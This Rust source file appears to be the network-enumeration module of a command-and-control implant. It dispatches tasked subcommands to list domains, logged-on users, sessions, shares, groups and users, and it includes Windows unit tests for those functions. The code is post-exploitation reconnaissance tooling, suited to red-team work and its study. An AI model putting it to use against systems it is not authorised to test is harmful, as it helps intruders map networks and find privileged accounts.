//! Network discovery and enumeration handlers.

mod handlers;
#[cfg(not(windows))]
#[path = "non_windows.rs"]
mod platform;
#[cfg(windows)]
#[path = "windows.rs"]
mod platform;
mod types;

use red_cell_common::demon::DemonNetCommand;
use tracing::{info, warn};

use super::{DispatchResult, parse_u32_le};

/// Handle a `CommandNet` task: dispatch to the appropriate network-discovery
/// subcommand handler.
///
/// Incoming payload (LE): `[subcommand: u32][...subcommand-specific fields]`
pub(super) fn handle_net(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandNet: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonNetCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandNet: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandNet dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonNetCommand::Domain => handlers::handle_net_domain(),
        DemonNetCommand::Logons => handlers::handle_net_logons(rest),
        DemonNetCommand::Sessions => handlers::handle_net_sessions(rest),
        DemonNetCommand::Computer => handlers::handle_net_computer(rest),
        DemonNetCommand::DcList => handlers::handle_net_dclist(rest),
        DemonNetCommand::Share => handlers::handle_net_share(rest),
        DemonNetCommand::LocalGroup => handlers::handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Group => handlers::handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Users => handlers::handle_net_users(rest),
    }
}

#[cfg(test)]
mod tests {
    use super::platform;
    use super::types::*;

    #[cfg(windows)]
    use super::platform::wstr_to_string;

    /// A null pointer must return an empty String, not cause UB.
    #[cfg(windows)]
    #[test]
    fn wstr_to_string_null_pointer_returns_empty() {
        // SAFETY: testing the explicit null-pointer guard.
        let result = unsafe { wstr_to_string(std::ptr::null()) };
        assert!(result.is_empty());
    }

    /// A well-formed ASCII UTF-16 string must round-trip correctly.
    #[cfg(windows)]
    #[test]
    fn wstr_to_string_roundtrips_ascii() {
        let wide: Vec<u16> = "hello\0".encode_utf16().collect();
        // SAFETY: `wide` is a stack-allocated null-terminated UTF-16 slice.
        let result = unsafe { wstr_to_string(wide.as_ptr()) };
        assert_eq!(result, "hello");
    }

    /// An empty UTF-16 string (NUL only) must return an empty Rust String.
    #[cfg(windows)]
    #[test]
    fn wstr_to_string_empty_wide_string_returns_empty() {
        let wide: Vec<u16> = [0u16].to_vec();
        // SAFETY: single-NUL slice is valid.
        let result = unsafe { wstr_to_string(wide.as_ptr()) };
        assert!(result.is_empty());
    }

    /// Must not panic on any Windows machine (domain-joined or workstation).
    #[cfg(windows)]
    #[test]
    fn platform_domain_name_does_not_panic() {
        let _ = platform::platform_domain_name();
    }

    /// Result must not contain embedded NUL characters (buffer truncation bug).
    #[cfg(windows)]
    #[test]
    fn platform_domain_name_no_embedded_nuls() {
        let name = platform::platform_domain_name();
        assert!(
            !name.contains('\0'),
            "domain name must not contain embedded NUL characters; got: {name:?}"
        );
    }

    /// Must not panic on any Windows machine.
    #[cfg(windows)]
    #[test]
    fn platform_logged_on_users_does_not_panic() {
        let _ = platform::platform_logged_on_users();
    }

    /// The currently logged-in user (from %USERNAME%) must appear in the list.
    #[cfg(windows)]
    #[test]
    fn platform_logged_on_users_contains_current_user() {
        let users = platform::platform_logged_on_users();
        let current = std::env::var("USERNAME").unwrap_or_default();
        if !current.is_empty() {
            assert!(
                users.iter().any(|u| u.eq_ignore_ascii_case(&current)),
                "current user {current:?} not found in logged-on users: {users:?}"
            );
        }
    }

    /// All returned user names must be free of embedded NUL characters.
    #[cfg(windows)]
    #[test]
    fn platform_logged_on_users_entries_have_no_embedded_nuls() {
        for u in platform::platform_logged_on_users() {
            assert!(!u.contains('\0'), "user name must not contain NUL: {u:?}");
        }
    }

    /// Must not panic — may return an empty Vec on a workstation.
    #[cfg(windows)]
    #[test]
    fn platform_sessions_does_not_panic() {
        let _ = platform::platform_sessions();
    }

    /// All returned session entries must have NUL-free string fields.
    #[cfg(windows)]
    #[test]
    fn platform_sessions_entries_have_valid_string_fields() {
        for s in platform::platform_sessions() {
            assert!(
                !s.client.contains('\0'),
                "session.client must not contain NUL: {:?}",
                s.client
            );
            assert!(!s.user.contains('\0'), "session.user must not contain NUL: {:?}", s.user);
        }
    }

    /// IPC$ is always present on Windows — the Server service creates it automatically.
    #[cfg(windows)]
    #[test]
    fn platform_shares_includes_ipc_dollar_and_admin_dollar() {
        let shares = platform::platform_shares();
        let names: Vec<&str> = shares.iter().map(|s| s.name.as_str()).collect();
        assert!(
            names.iter().any(|n| n.eq_ignore_ascii_case("IPC$")),
            "IPC$ must be present on any Windows machine; got: {names:?}"
        );
        for name in &names {
            assert!(!name.contains('\0'), "share name must not contain NUL: {name:?}");
        }
    }

    /// All share name/path fields must be free of embedded NUL characters.
    #[cfg(windows)]
    #[test]
    fn platform_shares_string_fields_have_no_embedded_nuls() {
        for s in platform::platform_shares() {
            assert!(!s.name.contains('\0'), "share.name must not contain NUL: {:?}", s.name);
            assert!(!s.path.contains('\0'), "share.path must not contain NUL: {:?}", s.path);
            assert!(!s.remark.contains('\0'), "share.remark must not contain NUL: {:?}", s.remark);
        }
    }

    /// The built-in Administrators and Users groups must be present on every Windows installation.
    #[cfg(windows)]
    #[test]
    fn platform_groups_includes_administrators_and_users() {
        let groups = platform::platform_groups();
        let names: Vec<&str> = groups.iter().map(|g| g.name.as_str()).collect();

        if let Some(admin_w) = platform::builtin_administrators_name_w() {
            let admin_name =
                String::from_utf16_lossy(admin_w.split(|&c| c == 0).next().unwrap_or(&[]));
            assert!(
                names.iter().any(|n| n.eq_ignore_ascii_case(&admin_name)),
                "built-in Administrators group ({admin_name:?}) must exist; got: {names:?}"
            );
        } else {
            assert!(!names.is_empty(), "expected at least one local group; got none");
        }

        if let Some(users_w) = platform::builtin_users_name_w() {
            let users_name =
                String::from_utf16_lossy(users_w.split(|&c| c == 0).next().unwrap_or(&[]));
            assert!(
                names.iter().any(|n| n.eq_ignore_ascii_case(&users_name)),
                "built-in Users group ({users_name:?}) must exist; got: {names:?}"
            );
        } else {
            assert!(!names.is_empty(), "expected at least one local group; got none");
        }
    }

    /// Group name/description must be free of embedded NUL characters.
    #[cfg(windows)]
    #[test]
    fn platform_groups_string_fields_have_no_embedded_nuls() {
        for g in platform::platform_groups() {
            assert!(!g.name.contains('\0'), "group.name must not contain NUL: {:?}", g.name);
            assert!(
                !g.description.contains('\0'),
                "group.description must not contain NUL: {:?}",
                g.description
            );
        }
    }

    /// `NetUserEnum` must return at least one local user account.
    #[cfg(windows)]
    #[test]
    fn platform_users_returns_at_least_one_account() {
        let users = platform::platform_users();
        assert!(!users.is_empty(), "expected at least one local user account from NetUserEnum");
    }

    /// At least one account must be flagged as admin when `administrators_group_members`
    /// returns a non-empty set.
    #[cfg(windows)]
    #[test]
    fn platform_users_includes_at_least_one_admin_account() {
        let admin_names = platform::administrators_group_members();
        if admin_names.is_empty() {
            return;
        }
        let users = platform::platform_users();
        assert!(
            users.iter().any(|u| u.is_admin),
            "at least one user with is_admin=true expected; got: {:?}",
            users.iter().map(|u| (&u.name, u.is_admin)).collect::<Vec<_>>()
        );
    }

    /// Every username returned by `administrators_group_members` that also
    /// appears in `platform_users` must have `is_admin = true`.
    #[cfg(windows)]
    #[test]
    fn platform_users_marks_administrators_group_members_as_admin() {
        let admin_names = platform::administrators_group_members();
        if admin_names.is_empty() {
            return;
        }
        let users = platform::platform_users();
        for u in &users {
            if admin_names.contains(&u.name.to_ascii_lowercase()) {
                assert!(
                    u.is_admin,
                    "user {:?} is in Administrators group but is_admin=false",
                    u.name
                );
            }
        }
    }

    /// `administrators_group_members` must return non-empty, NUL-free names.
    #[cfg(windows)]
    #[test]
    fn administrators_group_members_names_are_non_empty_and_nul_free() {
        for name in platform::administrators_group_members() {
            assert!(!name.is_empty(), "admin member name must not be empty");
            assert!(!name.contains('\0'), "admin member name must not contain NUL: {name:?}");
        }
    }

    /// All user name fields must be non-empty and free of embedded NUL chars.
    #[cfg(windows)]
    #[test]
    fn platform_users_names_are_non_empty_and_nul_free() {
        for u in platform::platform_users() {
            assert!(!u.name.is_empty(), "user.name must not be empty");
            assert!(!u.name.contains('\0'), "user.name must not contain NUL: {:?}", u.name);
        }
    }
}
